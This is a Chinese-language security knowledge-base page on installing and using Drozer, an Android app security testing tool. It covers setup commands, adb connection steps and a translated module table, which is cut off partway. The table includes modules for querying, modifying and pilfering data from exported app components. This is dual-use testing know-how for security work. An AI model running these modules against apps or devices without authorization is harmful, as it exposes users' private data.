<!doctype html>
<html lang="zh-Hans" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-移动安全/drozer测试四大组件/README" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.8.1">
<title data-rh="true">Drozer测试四大组件 | d4m1ts 知识库</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://blog.gm7.org/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://blog.gm7.org/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://blog.gm7.org/docs/移动安全/drozer测试四大组件/"><meta data-rh="true" property="og:locale" content="zh_Hans"><meta data-rh="true" name="docusaurus_locale" content="zh-Hans"><meta data-rh="true" name="docsearch:language" content="zh-Hans"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="Drozer测试四大组件 | d4m1ts 知识库"><meta data-rh="true" name="description" content="Drozer"><meta data-rh="true" property="og:description" content="Drozer"><link data-rh="true" rel="icon" href="/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://blog.gm7.org/docs/移动安全/drozer测试四大组件/"><link data-rh="true" rel="alternate" href="https://blog.gm7.org/docs/移动安全/drozer测试四大组件/" hreflang="zh-Hans"><link data-rh="true" rel="alternate" href="https://blog.gm7.org/docs/移动安全/drozer测试四大组件/" hreflang="x-default"><link data-rh="true" rel="preconnect" href="https://0LMFVYF6KV-dsn.algolia.net" crossorigin="anonymous"><script data-rh="true" type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Drozer测试四大组件","item":"https://blog.gm7.org/docs/移动安全/drozer测试四大组件/"}]}</script><link rel="alternate" type="application/rss+xml" href="/blog/rss.xml" title="d4m1ts 知识库 RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/blog/atom.xml" title="d4m1ts 知识库 Atom Feed">




<link rel="search" type="application/opensearchdescription+xml" title="d4m1ts 知识库" href="/opensearch.xml"><link rel="stylesheet" href="/assets/css/styles.f7944275.css">
<script src="/assets/js/runtime~main.d70f5b2f.js" defer="defer"></script>
<script src="/assets/js/main.9d3f1a2d.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<svg xmlns="http://www.w3.org/2000/svg" style="display: none;"><defs>
<symbol id="theme-svg-external-link" viewBox="0 0 24 24"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"/></symbol>
</defs></svg>
<script>!function(){var t="light";var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();document.documentElement.setAttribute("data-theme",e||t),document.documentElement.setAttribute("data-theme-choice",e||t)}(),function(){try{const c=new URLSearchParams(window.location.search).entries();for(var[t,e]of c)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><link rel="preload" as="image" href="/img/logo.svg"><div role="region" aria-label="跳到主要内容"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">跳到主要内容</a></div><nav aria-label="主导航" class="theme-layout-navbar navbar navbar--fixed-top"><div class="navbar__inner"><div class="theme-layout-navbar-left navbar__items"><button aria-label="切换导航栏" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/"><div class="navbar__logo"><img src="/img/logo.svg" alt="logo" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/img/logo.svg" alt="logo" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate"></b></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/docs/intro">知识库</a></div><div class="theme-layout-navbar-right navbar__items navbar__items--right"><a class="navbar__item navbar__link" href="/friends">友情链接</a><a href="https://github.com/damit5/damit5.github.io" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="system mode" aria-label="切换浅色/暗黑模式（当前为system mode）"><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP systemToggleIcon_QzmC"><path fill="currentColor" d="m12 21c4.971 0 9-4.029 9-9s-4.029-9-9-9-9 4.029-9 9 4.029 9 9 9zm4.95-13.95c1.313 1.313 2.05 3.093 2.05 4.95s-0.738 3.637-2.05 4.95c-1.313 1.313-3.093 2.05-4.95 2.05v-14c1.857 0 3.637 0.737 4.95 2.05z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"><button type="button" class="DocSearch DocSearch-Button" aria-label="搜索 (Command+K)"><span class="DocSearch-Button-Container"><svg width="20" height="20" class="DocSearch-Search-Icon" viewBox="0 0 20 20" aria-hidden="true"><path d="M14.386 14.386l4.0877 4.0877-4.0877-4.0877c-2.9418 2.9419-7.7115 2.9419-10.6533 0-2.9419-2.9418-2.9419-7.7115 0-10.6533 2.9418-2.9419 7.7115-2.9419 10.6533 0 2.9419 2.9418 2.9419 7.7115 0 10.6533z" stroke="currentColor" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"></path></svg><span class="DocSearch-Button-Placeholder">搜索</span></span><span class="DocSearch-Button-Keys"></span></button></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="theme-layout-main main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="回到顶部" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd"><nav aria-label="文档侧边栏" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/intro">Introduction</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/docs/渗透测试/">渗透测试</a><button aria-label="展开侧边栏分类 &#x27;渗透测试&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/docs/代码审计/">代码审计</a><button aria-label="展开侧边栏分类 &#x27;代码审计&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/编程开发/GO/GO基础/">编程开发</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" role="button" aria-expanded="true" href="/docs/category/前置基础知识">移动安全</a></div><ul class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/前置基础知识">前置基础知识</a><button aria-label="展开侧边栏分类 &#x27;前置基础知识&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/移动安全/adb使用/">ADB使用</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/docs/移动安全/drozer测试四大组件/">Drozer测试四大组件</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/frida-hook">frida-hook</a><button aria-label="展开侧边栏分类 &#x27;frida-hook&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/xposed-hook">xposed-hook</a><button aria-label="展开侧边栏分类 &#x27;xposed-hook&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/移动安全/mobsf-漏扫/">Mobsf-漏扫</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/移动安全/移动端各种方式抓包/">移动端各种方式抓包</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/高阶技巧">高阶技巧</a><button aria-label="展开侧边栏分类 &#x27;高阶技巧&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/游戏安全">游戏安全</a><button aria-label="展开侧边栏分类 &#x27;游戏安全&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/常规测试流程">常规测试流程</a><button aria-label="展开侧边栏分类 &#x27;常规测试流程&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/杂项-1">杂项</a><button aria-label="展开侧边栏分类 &#x27;杂项&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/应急响应/简介/">应急响应</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/category/chatgpt">AI</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/暂未分类/自建网盘/h5ai/">暂未分类</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/致谢">致谢</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/更新日志">更新日志</a></li></ul></nav></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_z5aJ"><div class="docItemContainer_c0TR"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="页面路径"><ul class="breadcrumbs"><li class="breadcrumbs__item"><a aria-label="主页面" class="breadcrumbs__link" href="/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">移动安全</span></li><li class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link">Drozer测试四大组件</span></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_bxCs"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">本页总览</button></div><div class="theme-doc-markdown markdown"><header><h1>Drozer测试四大组件</h1></header>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="drozer">Drozer<a href="#drozer" class="hash-link" aria-label="Drozer的直接链接" title="Drozer的直接链接">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="介绍">介绍<a href="#介绍" class="hash-link" aria-label="介绍的直接链接" title="介绍的直接链接">​</a></h3>
<p><a href="https://labs.withsecure.com/tools/drozer" target="_blank" rel="noopener noreferrer">Drozer</a>是一款开源的Android安全测试和攻击工具，由MWR InfoSecurity开发。它提供了一个命令行接口，允许用户在安全测试或攻击Android应用程序时进行自动化测试，发现潜在的漏洞和安全风险。Drozer是目前应用最为广泛的Android安全测试工具之一，其功能和易用性受到了广泛的认可和好评。</p>
<p>Drozer的主要功能包括：</p>
<ol>
<li>应用程序渗透测试：Drozer允许用户测试Android应用程序的安全性，包括动态和静态分析，以及漏洞扫描等。</li>
<li>应用程序漏洞挖掘：Drozer提供了一个插件系统，允许用户编写自己的插件来挖掘Android应用程序中的漏洞。</li>
<li>代码审计：Drozer允许用户快速浏览应用程序的源代码，并快速查找敏感信息和漏洞。</li>
<li>安全审计：Drozer提供了一些常见的安全审计功能，例如渗透测试、代码审计和漏洞扫描等。</li>
</ol>
<p>总的来说，Drozer是一款非常强大的Android安全测试工具，可以帮助安全测试人员发现Android应用程序中的漏洞和安全风险，并提供相应的解决方案。</p>
<p>GitHub: <a href="https://github.com/WithSecureLabs/drozer" target="_blank" rel="noopener noreferrer">https://github.com/WithSecureLabs/drozer</a></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="安装">安装<a href="#安装" class="hash-link" aria-label="安装的直接链接" title="安装的直接链接">​</a></h3>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="环境准备">环境准备<a href="#环境准备" class="hash-link" aria-label="环境准备的直接链接" title="环境准备的直接链接">​</a></h4>
<ul>
<li><a href="https://www.python.org/ftp/python/2.7.18/python-2.7.18-macosx10.9.pkg" target="_blank" rel="noopener noreferrer">python 2.7</a>【必须，不然可能会有玄学BUG】</li>
</ul>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="pc控制端安装">PC控制端安装<a href="#pc控制端安装" class="hash-link" aria-label="PC控制端安装的直接链接" title="PC控制端安装的直接链接">​</a></h4>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">## 安装依赖</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">python2 </span><span class="token parameter variable" style="color:#36acaa">-m</span><span class="token plain"> pip </span><span class="token function" style="color:#d73a49">install</span><span class="token plain"> wheel</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">python2 </span><span class="token parameter variable" style="color:#36acaa">-m</span><span class="token plain"> pip </span><span class="token function" style="color:#d73a49">install</span><span class="token plain"> pyyaml</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">python2 </span><span class="token parameter variable" style="color:#36acaa">-m</span><span class="token plain"> pip </span><span class="token function" style="color:#d73a49">install</span><span class="token plain"> pyhamcrest</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">python2 </span><span class="token parameter variable" style="color:#36acaa">-m</span><span class="token plain"> pip </span><span class="token function" style="color:#d73a49">install</span><span class="token plain"> protobuf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">python2 </span><span class="token parameter variable" style="color:#36acaa">-m</span><span class="token plain"> pip </span><span class="token function" style="color:#d73a49">install</span><span class="token plain"> pyopenssl</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">python2 </span><span class="token parameter variable" style="color:#36acaa">-m</span><span class="token plain"> pip </span><span class="token function" style="color:#d73a49">install</span><span class="token plain"> twisted</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">python2 </span><span class="token parameter variable" style="color:#36acaa">-m</span><span class="token plain"> pip </span><span class="token function" style="color:#d73a49">install</span><span class="token plain"> service_identity</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">## 下载whl到本地</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">wget</span><span class="token plain"> https://github.com/WithSecureLabs/drozer/releases/download/2.4.4/drozer-2.4.4-py2-none-any.whl</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">python2 </span><span class="token parameter variable" style="color:#36acaa">-m</span><span class="token plain"> pip </span><span class="token function" style="color:#d73a49">install</span><span class="token plain"> drozer-2.4.4-py2-none-any.whl</span><br></span></code></pre></div></div>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="设备端agent安装">设备端agent安装<a href="#设备端agent安装" class="hash-link" aria-label="设备端agent安装的直接链接" title="设备端agent安装的直接链接">​</a></h4>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">wget</span><span class="token plain"> https://github.com/mwrlabs/drozer/releases/download/2.3.4/drozer-agent-2.3.4.apk</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">adb </span><span class="token function" style="color:#d73a49">install</span><span class="token plain"> drozer-agent-2.3.4.apk</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="连接">连接<a href="#连接" class="hash-link" aria-label="连接的直接链接" title="连接的直接链接">​</a></h3>
<p><img decoding="async" loading="lazy" alt="启动drozer agent" src="/assets/images/image-20230313165154317-31101f3d8023536388174e19f0a6ca01.png" width="1890" height="1120" class="img_ev3q"></p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">## 端口转发</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">adb forward tcp:31415 tcp:31415</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">## 连接</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">drozer console connect</span><br></span></code></pre></div></div>
<p>出现如下内容，就说明OK了</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Selecting da226956879c9325 (Xiaomi MI 6 Plus 6.0.1)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            ..                    ..:.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">           ..o..                  .r..</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            ..a..  . ....... .  ..nd</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">              ro..idsnemesisand..pr</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">              .otectorandroidsneme.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">           .,sisandprotectorandroids+.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         ..nemesisandprotectorandroidsn:.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        .emesisandprotectorandroidsnemes..</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      ..isandp,..,rotectorandro,..,idsnem.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      .isisandp..rotectorandroid..snemisis.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      ,andprotectorandroidsnemisisandprotec.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">     .torandroidsnemesisandprotectorandroid.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">     .snemisisandprotectorandroidsnemesisan:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">     .dprotectorandroidsnemesisandprotector.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">drozer Console (v2.4.4)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">dz&gt;</span><br></span></code></pre></div></div>
<p>输入<code>run app.package.list</code>列举出所有的软件，可以列举就更加说明安装成功了。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="相关命令">相关命令<a href="#相关命令" class="hash-link" aria-label="相关命令的直接链接" title="相关命令的直接链接">​</a></h3>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">help: 列出所有可用命令，可通过</span><span class="token variable" style="color:#36acaa">`</span><span class="token variable builtin class-name" style="color:#36acaa">help</span><span class="token variable" style="color:#36acaa"> </span><span class="token variable operator" style="color:#393A34">&lt;</span><span class="token variable" style="color:#36acaa">module</span><span class="token variable operator" style="color:#393A34">&gt;</span><span class="token variable" style="color:#36acaa">`</span><span class="token plain">查看指定的帮助信息，如</span><span class="token variable" style="color:#36acaa">`</span><span class="token variable builtin class-name" style="color:#36acaa">help</span><span class="token variable" style="color:#36acaa"> app.package.list</span><span class="token variable" style="color:#36acaa">`</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">list: 列出可用模块的列表，可选择按名称过滤（也可以使用ls），如 </span><span class="token variable" style="color:#36acaa">`</span><span class="token variable" style="color:#36acaa">list </span><span class="token variable function" style="color:#d73a49">service</span><span class="token variable" style="color:#36acaa">`</span><span class="token plain">。</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run:  执行模块，使用方式 </span><span class="token variable" style="color:#36acaa">`</span><span class="token variable" style="color:#36acaa">run </span><span class="token variable operator" style="color:#393A34">&lt;</span><span class="token variable" style="color:#36acaa">module</span><span class="token variable operator" style="color:#393A34">&gt;</span><span class="token variable" style="color:#36acaa">`</span><span class="token plain">，如</span><span class="token variable" style="color:#36acaa">`</span><span class="token variable" style="color:#36acaa">run app.package.list</span><span class="token variable" style="color:#36acaa">`</span><br></span></code></pre></div></div>
<p>模块介绍翻译：</p>
<table><thead><tr><th>模块</th><th>说明</th></tr></thead><tbody><tr><td><code>app.activity.forintent</code></td><td>查找可以处理给定intent的activity</td></tr><tr><td><code>app.activity.info</code></td><td>获取有关已导出activity的信息。</td></tr><tr><td><code>app.activity.start</code></td><td>启动activity</td></tr><tr><td><code>app.broadcast.info</code></td><td>获取有关broadcast receiver的信息</td></tr><tr><td><code>app.broadcast.send</code></td><td>使用intent发送广播</td></tr><tr><td><code>app.broadcast.sniff</code></td><td>注册可以嗅探特定intent的broadcast receiver</td></tr><tr><td><code>app.package.attacksurface</code></td><td>获取软件包的攻击面</td></tr><tr><td><code>app.package.backup</code></td><td>列出使用备份API的软件包（<code>FLAG_ALLOW_BACKUP</code>返回true）</td></tr><tr><td><code>app.package.debuggable</code></td><td>查找可调试的软件包</td></tr><tr><td><code>app.package.info</code></td><td>获取有关已安装软件包的信息</td></tr><tr><td><code>app.package.launchintent</code></td><td>获取软件包的启动intent</td></tr><tr><td><code>app.package.list</code></td><td>列出软件包</td></tr><tr><td><code>app.package.manifest</code></td><td>获取软件包的AndroidManifest.xml</td></tr><tr><td><code>app.package.native</code></td><td>查找应用程序中嵌入的本地库。</td></tr><tr><td><code>app.package.shareduid</code></td><td>查找共享UID的软件包</td></tr><tr><td><code>app.provider.columns</code></td><td>列出内容提供者中的列</td></tr><tr><td><code>app.provider.delete</code></td><td>从内容提供者中删除</td></tr><tr><td><code>app.provider.download</code></td><td>从支持文件的内容提供者下载文件</td></tr><tr><td><code>app.provider.finduri</code></td><td>在软件包中查找引用的内容URI</td></tr><tr><td><code>app.provider.info</code></td><td>获取有关导出内容提供程序的信息</td></tr><tr><td><code>app.provider.insert</code></td><td>插入到内容提供程序</td></tr><tr><td><code>app.provider.query</code></td><td>查询内容提供程序</td></tr><tr><td><code>app.provider.read</code></td><td>从支持文件的内容提供程序中读取</td></tr><tr><td><code>app.provider.update</code></td><td>更新内容提供者中的记录</td></tr><tr><td><code>app.service.info</code></td><td>获取有关已导出服务的信息</td></tr><tr><td><code>app.service.send</code></td><td>向服务发送消息，并显示回复</td></tr><tr><td><code>app.service.start</code></td><td>启动服务</td></tr><tr><td><code>app.service.stop</code></td><td>停止服务</td></tr><tr><td><code>auxiliary.webcontentresolver</code></td><td>启动内容提供者的Web服务接口。</td></tr><tr><td><code>exploit.jdwp.check</code></td><td>打开@jdwp-control，查看哪些应用连接</td></tr><tr><td><code>exploit.pilfer.general.apnprovider</code></td><td>读